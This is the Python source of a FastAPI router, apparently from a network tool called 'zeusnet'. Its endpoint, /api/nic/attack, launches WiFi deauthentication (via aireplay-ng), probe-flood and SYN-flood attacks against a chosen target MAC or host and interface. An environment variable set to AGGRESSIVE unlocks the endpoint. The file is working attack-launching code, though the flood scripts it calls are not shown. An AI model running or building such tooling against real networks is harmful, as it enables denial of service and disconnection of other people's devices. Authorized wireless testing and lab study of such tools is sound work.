import os
import subprocess
import logging
from fastapi import APIRouter, Request, HTTPException
from pydantic import BaseModel, validator
from typing import Literal

router = APIRouter()
logger = logging.getLogger("zeusnet.nic")


# -----------------------------
# Models
# -----------------------------
class AttackRequest(BaseModel):
    type: Literal["deauth", "probe", "syn_flood"]
    target: str
    iface: str

    @validator("target")
    def validate_target(cls, v, values):
        if values.get("type") == "deauth":
            if not (len(v.split(":")) == 6 and all(len(part) == 2 for part in v.split(":"))):
                raise ValueError("Target must be a valid MAC address for deauth attack.")
        return v


# -----------------------------
# Attack Command Mappings
# -----------------------------
def run_deauth_attack(target: str, iface: str):
    cmd = ["aireplay-ng", "--deauth", "10", "-a", target, iface]
    return run_command(cmd, "Deauth Attack")

def run_probe_flood(target: str, iface: str):
    cmd = ["python3", "scripts/probe_flood.py", "--target", target, "--iface", iface]
    return run_command(cmd, "Probe Flood")

def run_syn_flood(target: str, iface: str):
    cmd = ["python3", "scripts/syn_flood.py", "--target", target, "--iface", iface]
    return run_command(cmd, "SYN Flood")


def run_command(cmd, label):
    try:
        logger.info(f"[NIC] Running {label}: {' '.join(cmd)}")
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=20)
        if result.returncode != 0:
            logger.error(f"[NIC] {label} Failed: {result.stderr}")
            raise HTTPException(status_code=500, detail=f"{label} failed: {result.stderr.strip()}")
        return {"status": "success", "output": result.stdout.strip()}
    except subprocess.TimeoutExpired:
        logger.warning(f"[NIC] {label} Timed out")
        raise HTTPException(status_code=500, detail=f"{label} timed out")
    except Exception as e:
        logger.exception(f"[NIC] Error in {label}")
        raise HTTPException(status_code=500, detail=str(e))


# -----------------------------
# Route
# -----------------------------
@router.post("/api/nic/attack")
async def launch_attack(request: Request):
    mode = os.environ.get("ZEUSNET_MODE", "SAFE").upper()
    if mode != "AGGRESSIVE":
        raise HTTPException(status_code=403, detail="Attack blocked in SAFE mode")

    try:
        data = await request.json()
        attack = AttackRequest(**data)
    except Exception as e:
        logger.warning(f"[NIC] Invalid payload: {e}")
        raise HTTPException(status_code=400, detail="Invalid payload format or values.")

    logger.info(f"[NIC] Launching {attack.type} attack on {attack.target} via {attack.iface}")

    if attack.type == "deauth":
        return run_deauth_attack(attack.target, attack.iface)
    elif attack.type == "probe":
        return run_probe_flood(attack.target, attack.iface)
    elif attack.type == "syn_flood":
        return run_syn_flood(attack.target, attack.iface)
    else:
        raise HTTPException(status_code=400, detail="Unsupported attack type.")
